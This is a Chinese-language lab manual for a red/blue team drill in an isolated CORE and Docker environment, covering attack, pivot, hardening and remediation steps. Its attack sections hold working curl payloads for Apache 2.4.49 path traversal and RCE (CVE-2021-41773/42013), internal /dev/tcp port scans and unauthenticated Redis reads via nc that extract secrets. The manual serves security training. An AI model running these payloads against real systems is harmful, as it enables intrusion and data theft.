# 漏洞演练手工执行手册（全 Docker + CORE 服务声明）

> 适用环境：CORE 9.2.1 + 本机 docker + 自建靶标镜像体系（路线 B：CORE 服务声明启动）
> 每条命令均可直接复制执行；`docker exec attacker …` 表示在攻击机容器内执行
> 演练资产：镜像 4 个 + CORE 自定义服务 4 个 + 攻击工具（Kali 工具链）

---

## 0. 前置检查（每次演练前跑一遍）

```bash
# CORE 守护进程在跑
systemctl is-active core-daemon

# 四个必需镜像在
docker images | grep -E "target-attacker-kali|target-fw|target-dmz-base|target-inn-base"

# 自定义服务已注册（应列出 4 个 drill 服务）

# 残留清理（上次演练的容器, 不清会撞名）

# 磁盘与端口
df -h / | tail -1
ss -ltn | grep 50051
```

## 2. 部署演练环境

**方式一：脚本一键部署（推荐）**
```bash
# vuln = 红方定向演练
python3 /tmp/drill/core_run_v3b.py vuln

# normal = 基线测绘 / 对照环境
python3 /tmp/drill/core_run_docker_v3.py normal   # 旧脚本, normal 对照用
```

**部署脚本自动完成**：
1. 清理旧会话与遗留容器
2. 创建 4 个 DOCKER 节点（attacker / fw1 / dmz-host / inner-host，三网段 10.0.0.x / 10.0.2.x / 10.0.1.x）
3. 声明服务（dmz=svc-httpd-41773-vuln，inner=svc-redis-unauth-vuln）
4. 启动会话（CORE 实例化：容器创建 → 服务文件 docker cp → 服务脚本执行）
5. 路由补齐 + 防火墙策略 + 旗标注入

**验证部署结果**：
```bash
docker ps --format '{{.Names}} {{.Status}}'      # 4 容器 Up
docker exec dmz-host pidof httpd                  # httpd 进程
docker exec inner-host redis-cli ping             # +PONG
curl -s -o /dev/null -w '%{http_code}\n' http://10.0.2.20/    # 200
```

## 3. 蓝方基线测绘（normal 模式下执行）

目的：验证默认部署**无洞**（对照基线，加固量化用）。

```bash
# ① 版本洞仍存在(代码级): 穿越读文件 → 预期 403/404(默认授权拦截)
docker exec attacker curl -s -o /dev/null -w '%{http_code}\n' --path-as-is \
  "http://10.0.2.20/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# ② RCE 不可达 → 预期 403
docker exec attacker curl -s -o /dev/null -w '%{http_code}\n' --path-as-is \
  -d 'echo;id' "http://10.0.2.20/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

# ③ Redis 仅本机 → dmz 容器探测 6379 应 BLOCKED
docker exec dmz-host sh -c "timeout 3 bash -c '</dev/tcp/10.0.1.20/6379 && echo OPEN!' || echo BLOCKED ✓"
```

## 4. 红方攻击链手工执行（vuln 模式，不知漏洞版）

> 攻击者视角：仅持有"目标范围 10.0.0.0/16"，全程工具驱动，不预知任何漏洞。
> 所有命令在攻击机容器内执行（`docker exec attacker …`）。

### 4.1 确认自身位置
```bash
docker exec attacker ip -br addr        # 自身 10.0.0.10/24
docker exec attacker ip route           # 网关 10.0.0.1
```

### 4.2 主机发现（相邻网段 web 探测）
```bash
docker exec attacker nmap -Pn -sT -T4 -p 80,443 --open 10.0.1.0/24,10.0.2.0/24
# 预期发现: 10.0.2.20:80 open
```

### 4.3 服务指纹
```bash
docker exec attacker nmap -Pn -sV -T4 -p 80 10.0.2.20
# 预期: Apache httpd 2.4.49 ((Unix))
```

### 4.4 Web 技术指纹
```bash
docker exec attacker whatweb -q --no-errors http://10.0.2.20/
```

### 4.5 目录枚举（发现攻击面入口 /cgi-bin/）
```bash
docker exec attacker gobuster dir -q -u http://10.0.2.20/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20
# 关键发现: /cgi-bin/ 存在 → 有 CGI 执行面
```

### 4.6 漏洞匹配（离线利用库检索）
```bash
docker exec attacker searchsploit apache httpd 2.4.49
# 命中: Apache HTTP Server 2.4.49 - Path Traversal & RCE (exploits/50383.sh)
# 对应 CVE: CVE-2021-41773(穿越读) / CVE-2021-42013(穿越 RCE, 需 cgi)
```

### 4.7 漏洞验证：路径穿越读
```bash
docker exec attacker curl -s --path-as-is \
  "http://10.0.2.20/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
# 预期: 返回 /etc/passwd 内容 → CVE-2021-41773 确认
```

### 4.8 漏洞升级：路径穿越 RCE
```bash
# ★实测修正(2026-11-15): mod_cgi 对无 header 的 CGI 输出会 500(malformed header)——
# 所有 RCE payload 先 echo Content-Type 再跟命令; 实测 echo;id 偶发成功属侥幸, 不可依赖
docker exec attacker curl -s --path-as-is \
  -d 'echo Content-Type: text/plain; echo; id; uname -a' \  # ★实测修正: mod_cgi 无 header 输出会 500
  "http://10.0.2.20/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
# 预期: uid=1(daemon) → CVE-2021-42013 RCE 确认
```

### 4.9 目标达成：旗标 1
```bash
docker exec attacker curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; ls /' \  # ★同上
  "http://10.0.2.20/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"     # 根目录发现 flag1.txt
docker exec attacker curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; cat /flag1.txt' \  # ★同上
  "http://10.0.2.20/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"     # FLAG{vuln_mode_traversal}
```

## 5. 内网横移手工执行（以 DMZ 为落脚点）

> 以下命令的执行位置 = 已破防的 DMZ 容器（`docker exec dmz-host …`）。

### 5.1 落脚点侦察
```bash
docker exec dmz-host ip -br addr      # 自身 10.0.2.20/24
docker exec dmz-host ip route         # default via 10.0.2.1
# 注意: 路由表不显示内网网段 → 需相邻网段枚举发现
```

### 5.2 内网主机发现（相邻网段枚举）
```bash
docker exec dmz-host bash -c 'for i in 1 2 3 4 5; do
  timeout 2 bash -c "</dev/tcp/10.0.$i.20/80 && echo 10.0.$i.20:80 OPEN" 2>/dev/null
done'
# 预期发现: 10.0.1.20:80 OPEN（内网 web 主机）
```

### 5.3 内网主机服务枚举
```bash
docker exec dmz-host bash -c 'for p in 22 80 443 3306 6379 8080; do
  timeout 2 bash -c "</dev/tcp/10.0.1.20/$p && echo $p OPEN" 2>/dev/null
done'
# 预期: 80(nginx) 与 6379(redis) 开放
```

### 5.4 Redis 未授权验证（无凭据探测）
```bash
docker exec dmz-host sh -c 'printf "PING\r\nQUIT\r\n" | nc -w 3 10.0.1.20 6379'
# 预期: +PONG → 未授权访问确认
```

### 5.5 数据窃取
```bash
docker exec dmz-host sh -c 'printf "KEYS *\r\nGET mail:session:secret\r\nGET mail:user:admin\r\nQUIT\r\n" | nc -w 3 10.0.1.20 6379'
# 预期: 枚举出业务键并读出
#   FLAG{vuln_mode_pivot}
#   backup-key-2026
```

## 6. 蓝方加固切换（防御演练）—— 路线 B 标准动作

不进容器、不改镜像，直接用 CORE 服务声明切换模式：

```bash
/opt/core/venv/bin/python3 - <<'PY'
from core.api.grpc import client
from core.api.grpc.wrappers import ServiceAction
c = client.CoreGrpcClient(); c.connect()
c.service_action(1, 12, "DmzVuln",   ServiceAction.STOP)    # 停漏洞服务(等价"打补丁")
c.service_action(1, 12, "DmzNormal", ServiceAction.START)   # 启正常服务(等价"恢复业务")
print("已切换 normal")
PY

# 红方视角复测(加固有效性量化): 同一 PoC 重放
docker exec attacker curl -s -o /dev/null -w '%{http_code}\n' --path-as-is \
  -d 'echo;id' "http://10.0.2.20/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"    # 预期 403
```

运行时切回 vuln：STOP DmzNormal → START DmzVuln。全过程容器不销毁、IP 不变。

## 7. 复盘清单

- 攻击时间线（各阶段时间戳，命令留痕在 shell history）
- 漏洞清单：CVE-2021-41773/42013（httpd 2.4.49）+ Redis 未授权访问（6379）
- 修复建议：
  1. httpd 升级 ≥2.4.51（或 2.4.49 不启用 cgi）
  2. Redis 加 `requirepass` + 保持 `protected-mode yes`
  3. fw1 补内网访问日志审计
- 旗标核对：`FLAG{vuln_mode_traversal}`（DMZ）+ `FLAG{vuln_mode_pivot}`（内网数据）

## 9. 常见问题

| 症状 | 原因 | 处理 |
|:--|:--|:--|
| `service does not exist` | daemon 未加载自定义服务 | 检查 core.conf 的 `custom_services_dir` 并重启 core-daemon |
| `unknown template` | 服务模板不在 `templates/` 子目录 | 移入 `/opt/core/etc/custom_services/drill/templates/` |
| 部署撞名 `container name already in use` | 上次容器残留 | `docker rm -f attacker fw1 dmz-host inner-host` |
| DefaultRoute 失败(chmod 找不到文件/ip 不存在) | CORE 服务在 docker 节点的已知限制 | 无碍——部署脚本已宿主侧补默认路由；或镜像统一 `WORKDIR /` + iproute2 |
| dmz→inner ping 不通但 tcp 通 | ICMP 被 FORWARD DROP（策略如此） | 用 TCP 探测（bash /dev/tcp）验证 |
| sh 里 `/dev/tcp` 报 No such file | sh 是 dash，不支持 /dev/tcp | 用 `bash -c` 执行 |
